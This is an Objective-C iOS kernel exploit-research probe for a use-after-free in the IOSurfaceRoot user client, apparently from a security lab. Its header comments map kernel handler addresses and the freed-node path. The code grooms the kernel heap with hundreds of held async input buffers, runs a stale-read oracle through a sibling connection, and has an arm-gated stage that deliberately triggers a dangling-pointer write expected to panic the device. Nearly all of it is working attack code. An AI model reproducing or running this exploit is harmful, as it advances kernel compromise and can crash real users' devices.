//
//  P168Iosurface112477.m — 112477 sel-17/18 classification + arm-gated
//  dangle + V2 sibling stale-read oracle. p168.
//  2026-11-16; V2 2026-11-19 (Rust505/Kimi-2011 cross-ref fusion).
//
//  Static map (23F77, verified 2026-11-16):
//    sel-17 handler 0x986cac8 (24-B struct container, ASYNC-ONLY —
//      args+0x10 reference array exists only on the async path;
//      sync = 0x2c2 forever: the 27.0.1 measured contract, their §15)
//      -> register 0x986978c: dup-check (node+0x20, node+0x58==client)
//         -> 0x2c9; alloc IOMallocType(DAT_7f35de0); node {next,prev,
//         payload3, +0x50, +0x58 owner} on the registry (client+0xe8)
//         list +0x198 under lock +0x148.
//    sel-18 handler 0x986caf0 -> 0x986988c clean unlink + free
//      (SYNC-only per the same measured contract).
//    fan-out: surface last-ref teardown 0x9858bc0 -> walker 0x9869984
//      -> owner_deref 0x98722dc = sync_take(*(owner+0xd8)) — the exact
//      instruction of the wild 24A446 panics (pc 0xa34ff88, 4/4 boots,
//      far-x0=0xd8): field corroboration of OUR map from outside.
//    teardown dereg GATED on client+0xf0 bit0 (23F77); the 27.2-era
//      sticky "deregistered" byte (+0xf1 on 24A446, possibly relocated
//      on 24B156) makes SAME-CONNECTION re-register return NotAttached.
//
//  V2 (2026-11-19, cross-ref receipts):
//    - Rust505/CVE-2026-112477 (26.4/23E246): reg->dereg frees the node
//      while the registry dup-check still READS the freed slot; an async
//      groom (512 kernel-held input buffers) flips dup 0xC9 -> 0x0
//      (STALE-READ, 40/40, sz=24 deterministic; entry consumed once:
//      d1=0/d2=C9/d3=C9). Content-dependence NEGATIVE in his E5.
//    - Kimi-2011/ios27-iosurface-uaf (27.0.1/24A446): sel-17 async-only,
//      refCnt=1 && ref!=0, IOServiceClose BEFORE CFRelease; 27.2 patch =
//      sticky byte + dereg-moved-to-front. On 24B156 the P154 receipt
//      says the sticky gate is LIVE -> the same-connection dup oracle is
//      dead; V2 runs the oracle through a SIBLING connection (fresh
//      client, no sticky byte) against the SHARED registry.
//    - Groom content: canary + id echo + the same-boot REAL heap anchor
//      (LabHeapAnchor) when one exists — self-identifying, honest.
//
//  Stage 1-2 fire behavior codes only; kernel writes: NONE. The dangle
//  sequence (register, close before release, destroy the OTHER surface)
//  runs ONLY with Documents/p168_dangle_arm.txt present. PANIC-POSSIBLE
//  only there. ONE TAP per boot.
//

#import "P168Iosurface112477.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabHeapAnchor.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

typedef mach_port_t       io_obj_t;

typedef CFMutableDictionaryRef (*p168_match_t)(const void *);
typedef io_obj_t              (*p168_getsvc_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t         (*p168_open_t)(io_obj_t, mach_port_t, uint32_t,
                                             io_obj_t *);
typedef kern_return_t         (*p168_close_t)(io_obj_t);
typedef kern_return_t         (*p168_struct_t)(io_obj_t, uint32_t,
                                               const void *, uint32_t,
                                               const void *, uint32_t,
                                               void *, uint32_t *,
                                               void *, uint32_t *);
typedef kern_return_t         (*p168_acall_t)(io_obj_t, uint32_t, mach_port_t,
                                              uint64_t *, uint32_t,
                                              const uint64_t *, uint32_t,
                                              const void *, uint32_t,
                                              void *, uint32_t *,
                                              void *, uint32_t *);
typedef CFTypeRef             (*p168_create_t)(CFDictionaryRef);
typedef uint32_t              (*p168_getid_t)(CFTypeRef);

#define P168_BUILD @"p168-iosurf-112477-v2"

static p168_match_t   sServiceMatching;
static p168_getsvc_t  sGetService;
static p168_open_t    sOpen;
static p168_close_t   sClose;
static p168_struct_t  sStruct;
static p168_acall_t   sACall;
static p168_create_t  sCreate;
static p168_getid_t   sGetID;

typedef struct { uint64_t a, b, c; } p168_in24_t;

static const char *p168_kIosurfaceRoot = "IOSurfaceRoot";

#define P168_GROOM_N 256   /* Rust505 used 512; 256 keeps the port table sane */

static BOOL p168_dangleArmed(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES)
                      firstObject];
    return [[NSFileManager defaultManager] fileExistsAtPath:
            [docs stringByAppendingPathComponent:@"p168_dangle_arm.txt"]];
}

static void p168_disk_log(NSString *out) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int fd = open([docs stringByAppendingPathComponent:@"p168_iosurf112477_log.txt"].fileSystemRepresentation,
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *c = out.UTF8String;
        if (c) { write(fd, c, strlen(c)); fcntl(fd, F_FULLFSYNC); }
        close(fd);
    }
}

static mach_port_t p168_wake(void) {
    mach_port_t p = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    return p;
}
static void p168_drop(mach_port_t p) {
    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

/* shape: 0=sync(control) 1=async refCnt=1 ref!=0 2=async ref=0 3=async refCnt=0 */
static kern_return_t p168_call(io_obj_t c, uint32_t sel, const p168_in24_t *in,
                               int shape, mach_port_t wp) {
    p168_in24_t buf = in ? *in : (p168_in24_t){0, 0, 0};
    uint64_t ref = 0x1122334455667788ull, zero = 0;
    uint32_t soc = 0;
    switch (shape) {
        case 0:  return sStruct(c, sel, &buf, sizeof(buf), NULL, 0, NULL, NULL, NULL, NULL);
        case 1:  return sACall(c, sel, wp, &ref, 1, NULL, 0, &buf, sizeof(buf), NULL, &soc, NULL, 0);
        case 2:  return sACall(c, sel, wp, &zero, 1, NULL, 0, &buf, sizeof(buf), NULL, &soc, NULL, 0);
        default: return sACall(c, sel, wp, NULL, 0, NULL, 0, &buf, sizeof(buf), NULL, &soc, NULL, 0);
    }
}

/* groom: kernel-held async input buffers (Rust505 trick). The async
   machinery allocates the input in the target kalloc bucket and holds
   it bound to the wake port; 256 live slots recycle the freed node. */
static int p168_groom(io_obj_t groomConn, const uint64_t *fields, int nf,
                      int inSz, mach_port_t *ports, int portCap) {
    uint8_t fbuf[128];
    memset(fbuf, 0, sizeof(fbuf));
    for (int i = 0; i < nf && i < 16; i++)
        memcpy(fbuf + i * 8, &fields[i], 8);
    uint64_t ref = 0xA1B2C3D4E5F60708ull;
    int n = 0;
    for (int i = 0; i < P168_GROOM_N && n < portCap; i++) {
        mach_port_t wp = p168_wake();
        if (!wp) break;
        kern_return_t r = sACall(groomConn, 1000, wp, &ref, 1, NULL, 0,
                                 fbuf, (uint32_t)inSz, NULL, NULL, NULL, 0);
        if (r != KERN_SUCCESS && r != 0xe00002c2) { p168_drop(wp); continue; }
        ports[n++] = wp;
    }
    return n;
}
static void p168_groom_free(mach_port_t *ports, int n) {
    for (int i = 0; i < n; i++) p168_drop(ports[i]);
}

@implementation P168Iosurface112477

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p168 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P168_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    [o appendString:@"112477 V2: async-contract calib + sticky ladder + SIBLING\n"
                   "stale-read oracle (Rust505 groom + Kimi calling law).\n"
                   "PANIC-POSSIBLE only in the ARM-GATED dangle stage. ONE TAP per boot.\n"];

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *d = h ? h : RTLD_DEFAULT;
    sServiceMatching = (p168_match_t)dlsym(d, "IOServiceMatching");
    sGetService      = (p168_getsvc_t)dlsym(d, "IOServiceGetMatchingService");
    sOpen            = (p168_open_t)dlsym(d, "IOServiceOpen");
    sClose           = (p168_close_t)dlsym(d, "IOServiceClose");
    sStruct          = (p168_struct_t)dlsym(d, "IOConnectCallStructMethod");
    sACall           = (p168_acall_t)dlsym(d, "IOConnectCallAsyncMethod");
    sCreate = (p168_create_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
    sGetID  = (p168_getid_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
    [o appendFormat:@"  [lib] iokit=%@ matching=%d getservice=%d open=%d "
                     @"struct=%d async=%d surf=%d/%d\n", h ? @"ok" : @"MISSING",
        sServiceMatching != NULL, sGetService != NULL, sOpen != NULL,
        sStruct != NULL, sACall != NULL, sCreate != NULL, sGetID != NULL];
    if (!sOpen || !sACall || !sStruct || !sCreate || !sServiceMatching || !sGetService) {
        [o appendString:@"[-] symbols missing — probe dead\n"]; p168_disk_log(o); return o;
    }

    CFMutableDictionaryRef m = sServiceMatching(p168_kIosurfaceRoot);
    io_obj_t svc = sGetService(0, m);
    if (m) CFRelease(m);
    io_obj_t conn = 0;
    kern_return_t kr = svc ? sOpen(svc, mach_task_self(), 0, &conn) : 0xe00002eb;
    [o appendFormat:@"  [open] svc=%#x open=%#x conn=%#x\n",
        (unsigned)(uintptr_t)svc, (unsigned)kr, (unsigned)conn];
    if (kr != KERN_SUCCESS || !conn) {
        [o appendString:@"[-] no IOSurfaceRoot UC connect\n"]; p168_disk_log(o); return o;
    }

    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 2, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = 0x100, hh = 0x100;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nhh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nhh);
    CFTypeRef s1 = sCreate(props);
    CFTypeRef s2 = sCreate(props);
    uint32_t id1 = s1 ? sGetID(s1) : 0;
    uint32_t id2 = s2 ? sGetID(s2) : 0;
    CFRelease(nw); CFRelease(nhh); CFRelease(props);
    [o appendFormat:@"  [surf] s1=%@ id=%u  s2=%@ id=%u\n",
        s1 ? @"ok" : @"fail", id1, s2 ? @"ok" : @"fail", id2];
    if (!s1) { if (sClose) sClose(conn); [o appendString:@"[-] surface create failed\n"]; p168_disk_log(o); return o; }

    p168_in24_t reg = { id1, 1, id1 };
    mach_port_t wp = p168_wake();

    /* ---- Stage A: calling-convention calibration (Kimi/Rust505 law) ---- */
    [o appendString:@"  [A] async-contract calib (sel17, 24B):\n"];
    int bestShape = -1;
    for (int shape = 0; shape < 4; shape++) {
        kern_return_t r = p168_call(conn, 17, &reg, shape, wp);
        [o appendFormat:@"      shape=%d -> %#x\n", shape, (unsigned)r];
        if (r == KERN_SUCCESS && bestShape < 0) bestShape = shape;
        if (r == KERN_SUCCESS) p168_call(conn, 18, &reg, 0, wp);   /* clean the node */
    }
    [o appendFormat:@"      best shape=%d (1 = the async contract; 0/2/3 = %#x controls)\n",
        bestShape, 0xe00002c2];
    if (bestShape != 1) {
        [o appendString:@"[-] async contract not honored on this build — V2 ladder dead; "
                       "sync C9/C2 shapes above are the honest receipt\n"];
        if (sClose) sClose(conn);
        if (s1) CFRelease(s1); if (s2) CFRelease(s2);
        p168_drop(wp); p168_disk_log(o); return o;
    }

    /* ---- Stage B: sticky ladder (the 24B156 gate verdict) ---- */
    {
        kern_return_t r1 = p168_call(conn, 17, &reg, 1, wp);   /* register   */
        kern_return_t r2 = p168_call(conn, 17, &reg, 1, wp);  /* dup        */
        kern_return_t r3 = p168_call(conn, 18, &reg, 0, wp);   /* dereg      */
        kern_return_t r4 = p168_call(conn, 17, &reg, 1, wp);   /* re-reg     */
        [o appendFormat:@"  [B] reg=%#x dup=%#x dereg=%#x re-reg=%#x\n",
            (unsigned)r1, (unsigned)r2, (unsigned)r3, (unsigned)r4];
        [o appendString:(r4 == 0xe00002d8)
            ? @"      re-reg=0x2D8: the 27.2-era sticky gate is LIVE — same-conn "
               @"oracle dead; V2 runs the dup through the SIBLING below\n"
            : @"      re-reg=0x0: sticky gate ABSENT on this build (pre-27.2 shape) — "
               @"Rust505's same-conn oracle would work here too\n"];
        if (r4 != KERN_SUCCESS) {
            /* the failed re-reg left no node; nothing to clean */
        } else {
            p168_call(conn, 18, &reg, 0, wp);
        }
    }

    /* ---- Stage E: SIBLING stale-read oracle (behavior-only) ---- */
    {
        io_obj_t groomConn = 0, sib = 0;
        uint64_t anchor = LabHeapAnchorSameBoot();
        if (anchor)
            [o appendFormat:@"  [anchor] groom tag carries same-boot heap leak %#llx (own-page class only)\n",
                (unsigned long long)anchor];
        else
            [o appendString:@"  [anchor] no same-boot heap leak — groom carries canary+id only (honest)\n"];

        /* K1 control (no groom): does the freed slot still carry the id
           for the dup-check after dereg? sibling reg -> expect 0x2c9. */
        int k1 = 0;
        for (int i = 0; i < 5; i++) {
            p168_call(conn, 17, &reg, 1, wp);
            p168_call(conn, 18, &reg, 0, wp);
            if (sOpen(svc, mach_task_self(), 0, &sib) != KERN_SUCCESS) break;
            mach_port_t swp = p168_wake();
            kern_return_t r = p168_call(sib, 17, &reg, 1, swp);
            p168_drop(swp);
            if (r == 0xe00002c9) k1++;
            if (r == KERN_SUCCESS) p168_call(sib, 18, &reg, 0, wp);
            sClose(sib); sib = 0;
            usleep(2000);
        }
        [o appendFormat:@"  [E-K1] no-groom sibling dup==0x2c9: %d/5 "
                       @"(the freed slot still feeds the dup-check)\n", k1];

        /* groom sweep + content dependence */
        static const int sizes[] = {24, 32, 48, 64, 96};
        if (sOpen(svc, mach_task_self(), 0, &groomConn) == KERN_SUCCESS) {
            for (int si = 0; si < 5; si++) {
                int hits = 0; kern_return_t last = 0xe00002c9;
                int nf = sizes[si] / 8;
                uint64_t fields[16];
                for (int t = 0; t < 2; t++) {   /* t=0: no id echo; t=1: id echo */
                    for (int f = 0; f < nf && f < 16; f++) fields[f] = 0;
                    fields[0] = 0x21;
                    fields[1] = t ? id1 : 0xdead;
                    fields[2] = anchor ? anchor : 0x4141414141414141ull;
                    fields[3] = 0x43414e415259ull;
                    int nhits = 0; kern_return_t llast = 0xe00002c9;
                    for (int i = 0; i < 5; i++) {
                        p168_call(conn, 17, &reg, 1, wp);
                        p168_call(conn, 18, &reg, 0, wp);
                        mach_port_t gports[P168_GROOM_N];
                        int gn = p168_groom(groomConn, fields, nf, sizes[si],
                                            gports, P168_GROOM_N);
                        if (sOpen(svc, mach_task_self(), 0, &sib) == KERN_SUCCESS) {
                            mach_port_t swp = p168_wake();
                            kern_return_t r = p168_call(sib, 17, &reg, 1, swp);
                            p168_drop(swp);
                            if (r != 0xe00002c9) { nhits++; llast = r;
                                if (r == KERN_SUCCESS) p168_call(sib, 18, &reg, 0, wp);
                            }
                            sClose(sib); sib = 0;
                        }
                        p168_groom_free(gports, gn);
                        usleep(2000);
                    }
                    [o appendFormat:@"  [E-sz%d-%s] hits=%d/5 last=%#x\n",
                        sizes[si], t ? "id" : "noid", nhits, (unsigned)llast];
                    if (t == 1) { hits = nhits; last = llast; }
                }
                if (hits) {
                    [o appendFormat:@"      sz=%d STALE-READ candidate (dup %#x -> not-2c9 under groom) — "
                                   @"triple-consume next tap if reproducible\n", sizes[si], (unsigned)last];
                }
            }
            sClose(groomConn);
        } else {
            [o appendString:@"  [E] groom connection open failed — oracle skipped\n"];
        }
    }

    /* ---- Stage D: ARM-GATED dangle (PANIC-POSSIBLE) ---- */
    BOOL armed = p168_dangleArmed();
    if (!armed) {
        [o appendString:@"  [arm] p168_dangle_arm.txt ABSENT — dangle stage SKIPPED\n"
                         "[*] arm = create Documents/p168_dangle_arm.txt, fresh boot, ONE tap\n"];
    } else if (!s2) {
        [o appendString:@"  [arm] missing prereq — skipped\n"];
    } else {
        [o appendFormat:@"  [ARM] dangle sequence (PANIC-POSSIBLE): async-register s1 (id=%u)\n", id1];
        kern_return_t r = p168_call(conn, 17, &reg, 1, wp);
        [o appendFormat:@"      async reg kr=%#x\n", (unsigned)r];
        [o appendString:@"      -> IOServiceClose BEFORE CFRelease (the client frees\n"
                         "         while its node stays on the registry list)\n"];
        kr = sClose(conn); conn = 0;
        [o appendFormat:@"      IOServiceClose kr=%#x\n", (unsigned)kr];
        [o appendString:@"      -> destroy the OTHER surface (s2): its teardown runs the\n"
                         "         global fan-out and derefs the freed owner at +0xd8\n"
                         "         (sync_take/release = free-object WRITE). Expected panic\n"
                         "         fingerprint: ldr [x,#0xd8]-class tag-check fault.\n"];
        CFRelease(s2); s2 = NULL;
        [o appendString:@"      s2 released. Still running = fan-out survived the freed owner\n"];
    }

    /* cleanup */
    p168_drop(wp);
    if (s2 && !armed) CFRelease(s2);
    if (s1 && !(armed && conn == 0)) CFRelease(s1);
    if (conn && sClose) sClose(conn);
    [o appendString:@"=== p168 done (one tap per boot) ===\n"];
    p168_disk_log(o);
    return o;
}

@end
